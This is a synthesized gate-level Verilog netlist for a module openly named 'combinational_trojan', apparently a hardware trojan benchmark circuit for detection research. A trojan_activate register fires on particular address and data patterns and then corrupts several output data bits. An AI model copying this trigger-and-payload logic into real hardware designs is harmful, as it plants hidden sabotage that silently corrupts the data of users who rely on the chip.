/////////////////////////////////////////////////////////////
// Created by: Synopsys DC Expert(TM) in wire load mode
// Version   : V-2023.12-SP5
// Date      : Wed Apr 23 10:18:18 2025
/////////////////////////////////////////////////////////////


module combinational_trojan ( clk, rst, addr_en, addr, data_in, data_out );
  input [19:0] addr;
  input [7:0] data_in;
  output [7:0] data_out;
  input clk, rst, addr_en;
  wire   trojan_activate, n61, net536, net1084, net1092, net1093, net1100,
         net1106, net1113, net1119, net1150, net1151, net1152, net1158,
         net1159, net1161, net1169, net1171, net1173, net1178, net1180,
         net1185, net1191, net1201, net1210, net1220, net1229, net1263,
         net1283, net1357, net1371, net1372, net1375, net1374, net1358,
         net1206, net1097, net1104, net1101, net2947, net2929, net2898,
         net2966, net1783, net1381, net1804, net4494, net4487, net4539,
         net4544, net4554, net4470, net2954, net1197, net1190, net1188,
         net1149, net1144, net1143, net1124, net1111, net2938, net1369,
         net1125, net1116, net1115, net1230, net1198, net1187, net1186,
         net1184, n62, n63, n64, n65, n66, n67, n68, n69, n70, n71, n72, n73,
         n74, n75, n76, n77, n78, n79, n80, n81, n82, n83, n84, n85, n86, n87,
         n88, n89, n90, n91, n92, n93, n94, n95, n96, n97, n98, n99, n100,
         n101, n102, n103, n104, n105, n106, n107, n108, n109, n110, n111,
         n112, n113, n114, n115, n116, n117, n118, n119, n120, n121, n122,
         n123, n124, n125, n126, n127, n128, n129, n130, n131, n132, n133,
         n134, n135, n136, n137, n138, n139, n140, n141, n142, n143, n144,
         n145, n146, n147, n148, n149, n150, n151, n152, n153, n154, n155,
         n156, n157, n158, n159, n160, n161;
  assign data_out[0] = net536;

  DFFPOSX1 trojan_activate_reg ( .D(n61), .CLK(clk), .Q(trojan_activate) );
  INVX1 U70 ( .A(n87), .Y(n62) );
  INVX1 U71 ( .A(net2898), .Y(n63) );
  AND2X2 U72 ( .A(n74), .B(n83), .Y(n102) );
  INVX1 U73 ( .A(n123), .Y(n64) );
  INVX1 U74 ( .A(net1372), .Y(n66) );
  AND2X2 U75 ( .A(n78), .B(n66), .Y(n65) );
  OR2X2 U76 ( .A(n143), .B(n64), .Y(n67) );
  OR2X2 U77 ( .A(n143), .B(net2898), .Y(n68) );
  INVX1 U78 ( .A(net1113), .Y(n69) );
  AND2X2 U79 ( .A(n111), .B(n152), .Y(n75) );
  INVX1 U80 ( .A(net1116), .Y(n70) );
  INVX1 U81 ( .A(n70), .Y(n71) );
  INVX2 U82 ( .A(net1115), .Y(net1116) );
  INVX1 U83 ( .A(n96), .Y(n72) );
  INVX1 U84 ( .A(addr[0]), .Y(net4470) );
  OR2X1 U85 ( .A(addr[17]), .B(addr[16]), .Y(n73) );
  INVX1 U86 ( .A(n73), .Y(n74) );
  INVX1 U87 ( .A(n75), .Y(n153) );
  NOR3X1 U88 ( .A(addr[0]), .B(n76), .C(addr[7]), .Y(n142) );
  INVX1 U89 ( .A(addr[1]), .Y(n76) );
  AND2X1 U90 ( .A(n140), .B(net4487), .Y(n77) );
  INVX1 U91 ( .A(n77), .Y(net1173) );
  OAI21X1 U92 ( .A(trojan_activate), .B(net2947), .C(net1084), .Y(n82) );
  NOR3X1 U93 ( .A(addr[2]), .B(addr[4]), .C(addr[5]), .Y(n78) );
  NOR3X1 U94 ( .A(addr[1]), .B(addr[11]), .C(addr[10]), .Y(n138) );
  OR2X1 U95 ( .A(addr[0]), .B(n79), .Y(n131) );
  INVX1 U96 ( .A(addr[1]), .Y(n79) );
  NOR3X1 U97 ( .A(addr[6]), .B(net1169), .C(n80), .Y(n81) );
  INVX1 U98 ( .A(n86), .Y(n80) );
  INVX1 U99 ( .A(n81), .Y(n154) );
  INVX1 U100 ( .A(n82), .Y(n104) );
  NOR3X1 U101 ( .A(addr[18]), .B(addr[19]), .C(addr[15]), .Y(n83) );
  OR2X1 U102 ( .A(addr[7]), .B(n84), .Y(n130) );
  INVX1 U103 ( .A(addr[10]), .Y(n84) );
  NOR3X1 U104 ( .A(data_in[3]), .B(data_in[4]), .C(data_in[5]), .Y(n152) );
  AND2X2 U105 ( .A(net1084), .B(n121), .Y(n149) );
  OAI21X1 U106 ( .A(n132), .B(net1116), .C(data_in[2]), .Y(n107) );
  OR2X2 U107 ( .A(addr[2]), .B(addr[0]), .Y(n85) );
  INVX1 U108 ( .A(addr[1]), .Y(n113) );
  INVX1 U109 ( .A(net1159), .Y(n89) );
  INVX1 U110 ( .A(data_in[4]), .Y(n139) );
  INVX1 U111 ( .A(data_in[7]), .Y(n99) );
  INVX1 U112 ( .A(data_in[2]), .Y(n112) );
  NOR3X1 U113 ( .A(data_in[7]), .B(n85), .C(data_in[6]), .Y(n86) );
  INVX1 U114 ( .A(net1161), .Y(n90) );
  INVX1 U115 ( .A(net1171), .Y(n94) );
  INVX1 U116 ( .A(n116), .Y(n87) );
  INVX1 U117 ( .A(n116), .Y(net1111) );
  XOR2X1 U118 ( .A(net1371), .B(data_in[1]), .Y(data_out[1]) );
  NOR3X1 U119 ( .A(n89), .B(n90), .C(n154), .Y(n88) );
  INVX1 U120 ( .A(n96), .Y(net1381) );
  INVX1 U121 ( .A(n136), .Y(n98) );
  INVX1 U122 ( .A(n141), .Y(n92) );
  NOR3X1 U123 ( .A(net4494), .B(n92), .C(n137), .Y(n91) );
  NOR3X1 U124 ( .A(n94), .B(net1173), .C(n153), .Y(n93) );
  INVX1 U125 ( .A(n93), .Y(n155) );
  OAI21X1 U126 ( .A(net1150), .B(net1151), .C(n158), .Y(n95) );
  INVX1 U127 ( .A(n95), .Y(n61) );
  INVX1 U128 ( .A(n124), .Y(n97) );
  NOR3X1 U129 ( .A(n98), .B(n97), .C(net1783), .Y(n96) );
  AND2X2 U130 ( .A(n138), .B(n122), .Y(n146) );
  MUX2X1 U131 ( .B(n117), .A(n118), .S(n99), .Y(data_out[7]) );
  OR2X2 U132 ( .A(addr[13]), .B(addr[14]), .Y(net1372) );
  AND2X2 U133 ( .A(data_in[3]), .B(addr_en), .Y(net2966) );
  INVX1 U134 ( .A(net2966), .Y(n100) );
  OR2X2 U135 ( .A(net1206), .B(net1283), .Y(n148) );
  OR2X2 U136 ( .A(addr[12]), .B(addr[4]), .Y(net1169) );
  AND2X2 U137 ( .A(data_in[1]), .B(data_in[0]), .Y(net1119) );
  INVX1 U138 ( .A(net1119), .Y(n101) );
  AND2X2 U139 ( .A(n146), .B(net2929), .Y(n143) );
  OR2X2 U140 ( .A(net1097), .B(n147), .Y(n151) );
  INVX1 U141 ( .A(n151), .Y(n103) );
  INVX1 U142 ( .A(net1125), .Y(n105) );
  AND2X2 U143 ( .A(net2954), .B(net2938), .Y(net1125) );
  INVX1 U144 ( .A(net1125), .Y(n106) );
  AND2X2 U145 ( .A(data_in[1]), .B(data_in[0]), .Y(n132) );
  AND2X2 U146 ( .A(addr[3]), .B(addr[8]), .Y(net1185) );
  INVX1 U147 ( .A(net1185), .Y(n108) );
  AND2X2 U148 ( .A(addr[10]), .B(addr[11]), .Y(n140) );
  BUFX2 U149 ( .A(net4539), .Y(n109) );
  AND2X2 U150 ( .A(addr[3]), .B(addr[8]), .Y(net4554) );
  INVX1 U151 ( .A(net4554), .Y(n110) );
  INVX1 U152 ( .A(n123), .Y(net2898) );
  XOR2X1 U153 ( .A(n150), .B(data_in[5]), .Y(data_out[5]) );
  NOR3X1 U154 ( .A(net1178), .B(n112), .C(n113), .Y(n111) );
  INVX1 U155 ( .A(net1374), .Y(n114) );
  INVX1 U156 ( .A(n114), .Y(n115) );
  AND2X2 U157 ( .A(addr[8]), .B(addr[9]), .Y(net4487) );
  AND2X2 U158 ( .A(n156), .B(n157), .Y(n158) );
  OR2X2 U159 ( .A(data_in[1]), .B(data_in[0]), .Y(net1178) );
  BUFX2 U160 ( .A(net1149), .Y(n116) );
  OR2X2 U161 ( .A(n69), .B(n62), .Y(net1151) );
  BUFX2 U162 ( .A(n144), .Y(n117) );
  AND2X2 U163 ( .A(n149), .B(n68), .Y(n145) );
  INVX1 U164 ( .A(n145), .Y(n118) );
  OR2X2 U165 ( .A(n109), .B(n108), .Y(n137) );
  BUFX2 U166 ( .A(net1144), .Y(n119) );
  AND2X2 U167 ( .A(addr[3]), .B(addr[8]), .Y(n134) );
  INVX1 U168 ( .A(n134), .Y(n120) );
  AND2X2 U169 ( .A(net1158), .B(net1381), .Y(n147) );
  INVX1 U170 ( .A(n147), .Y(n121) );
  OR2X2 U171 ( .A(n109), .B(n110), .Y(net1783) );
  INVX1 U172 ( .A(net1783), .Y(n122) );
  BUFX2 U173 ( .A(net1101), .Y(n123) );
  AND2X2 U174 ( .A(data_in[0]), .B(net1357), .Y(net1371) );
  OR2X2 U175 ( .A(addr[11]), .B(net4470), .Y(net4494) );
  INVX1 U176 ( .A(net4494), .Y(n124) );
  BUFX2 U177 ( .A(n159), .Y(n125) );
  AND2X2 U178 ( .A(n67), .B(n103), .Y(n150) );
  BUFX2 U179 ( .A(net1124), .Y(n126) );
  AND2X2 U180 ( .A(n102), .B(n65), .Y(net1804) );
  INVX1 U181 ( .A(net1804), .Y(n127) );
  INVX1 U182 ( .A(net1804), .Y(n128) );
  INVX1 U183 ( .A(n88), .Y(n129) );
  AND2X2 U184 ( .A(n133), .B(net1184), .Y(net1198) );
  INVX1 U185 ( .A(net1198), .Y(net1150) );
  NAND3X1 U186 ( .A(net1198), .B(net1111), .C(net1113), .Y(net1101) );
  NAND3X1 U187 ( .A(net1143), .B(n87), .C(net1198), .Y(net1124) );
  NOR3X1 U188 ( .A(addr[2]), .B(addr[4]), .C(addr[5]), .Y(net1184) );
  NOR3X1 U189 ( .A(net1187), .B(net1186), .C(n120), .Y(n133) );
  INVX1 U190 ( .A(addr[12]), .Y(net1186) );
  INVX1 U191 ( .A(addr[9]), .Y(net1187) );
  AND2X1 U192 ( .A(addr[7]), .B(addr[5]), .Y(net1230) );
  AND2X1 U193 ( .A(addr[3]), .B(net1230), .Y(net1171) );
  NAND3X1 U194 ( .A(addr[12]), .B(addr[9]), .C(addr[7]), .Y(net4539) );
  XOR2X1 U195 ( .A(net1369), .B(data_in[0]), .Y(net536) );
  INVX1 U196 ( .A(net1116), .Y(net1369) );
  OAI21X1 U197 ( .A(net1263), .B(n71), .C(n107), .Y(data_out[2]) );
  OAI21X1 U198 ( .A(n126), .B(net1104), .C(n105), .Y(net1115) );
  AND2X2 U199 ( .A(net1263), .B(net1357), .Y(net1220) );
  INVX1 U200 ( .A(n128), .Y(net2938) );
  OAI21X1 U201 ( .A(net1104), .B(net1197), .C(net1375), .Y(net1106) );
  OAI21X1 U202 ( .A(n126), .B(net1158), .C(n106), .Y(net1357) );
  INVX1 U203 ( .A(n128), .Y(net4544) );
  NOR3X1 U204 ( .A(net4470), .B(addr[6]), .C(n127), .Y(net2929) );
  INVX1 U205 ( .A(trojan_activate), .Y(net1104) );
  NAND3X1 U206 ( .A(net1113), .B(n87), .C(net1152), .Y(net1197) );
  NAND3X1 U207 ( .A(n135), .B(net1188), .C(net1190), .Y(net1149) );
  NOR3X1 U208 ( .A(addr[18]), .B(addr[17]), .C(addr[19]), .Y(net1190) );
  NOR3X1 U209 ( .A(addr[14]), .B(addr[16]), .C(addr[15]), .Y(net1188) );
  INVX1 U210 ( .A(addr[13]), .Y(n135) );
  NOR3X1 U211 ( .A(n119), .B(n130), .C(n131), .Y(net1143) );
  NAND3X1 U212 ( .A(addr_en), .B(addr[11]), .C(addr[6]), .Y(net1144) );
  AND2X2 U213 ( .A(addr_en), .B(n91), .Y(net2954) );
  NOR3X1 U214 ( .A(addr[18]), .B(addr[19]), .C(addr[17]), .Y(net1159) );
  NOR3X1 U215 ( .A(addr[6]), .B(addr[10]), .C(addr[1]), .Y(n136) );
  XOR2X1 U216 ( .A(n125), .B(n139), .Y(data_out[4]) );
  NAND3X1 U217 ( .A(addr[11]), .B(addr[6]), .C(addr[10]), .Y(net1201) );
  NOR3X1 U218 ( .A(addr[6]), .B(addr[10]), .C(addr[1]), .Y(n141) );
  AND2X2 U219 ( .A(net4544), .B(net2947), .Y(net1374) );
  INVX1 U220 ( .A(n72), .Y(net2947) );
  NOR3X1 U221 ( .A(addr[15]), .B(net1372), .C(addr[16]), .Y(net1161) );
  OAI21X1 U222 ( .A(n115), .B(net2898), .C(n104), .Y(net1093) );
  AOI21X1 U223 ( .A(n63), .B(n114), .C(n148), .Y(n144) );
  INVX1 U224 ( .A(n67), .Y(net1210) );
  AND2X2 U225 ( .A(net1381), .B(net1104), .Y(net1206) );
  INVX1 U226 ( .A(net1358), .Y(net1097) );
  NOR3X1 U227 ( .A(net1097), .B(net1180), .C(net1206), .Y(net1092) );
  NOR3X1 U228 ( .A(n100), .B(n139), .C(net1100), .Y(net1358) );
  AND2X2 U229 ( .A(net1229), .B(net1358), .Y(net1084) );
  INVX1 U230 ( .A(net1374), .Y(net1375) );
  AND2X2 U231 ( .A(net1191), .B(n142), .Y(net1113) );
  INVX1 U232 ( .A(net1084), .Y(net1283) );
  AND2X2 U233 ( .A(n101), .B(n112), .Y(net1100) );
  INVX1 U234 ( .A(net1100), .Y(net1263) );
  INVX1 U235 ( .A(trojan_activate), .Y(net1158) );
  INVX1 U236 ( .A(data_in[6]), .Y(n161) );
  INVX1 U237 ( .A(rst), .Y(n157) );
  INVX1 U238 ( .A(data_in[5]), .Y(net1180) );
  AND2X1 U239 ( .A(data_in[5]), .B(data_in[6]), .Y(net1229) );
  XOR2X1 U240 ( .A(net1220), .B(data_in[3]), .Y(data_out[3]) );
  INVX1 U241 ( .A(net1201), .Y(net1191) );
  INVX1 U242 ( .A(net1150), .Y(net1152) );
  OAI21X1 U243 ( .A(n155), .B(n129), .C(net1158), .Y(n156) );
  NAND3X1 U244 ( .A(net1263), .B(net2966), .C(net1106), .Y(n159) );
  OAI21X1 U245 ( .A(data_in[6]), .B(net1092), .C(net1093), .Y(n160) );
  AOI21X1 U246 ( .A(n161), .B(net1210), .C(n160), .Y(data_out[6]) );
endmodule

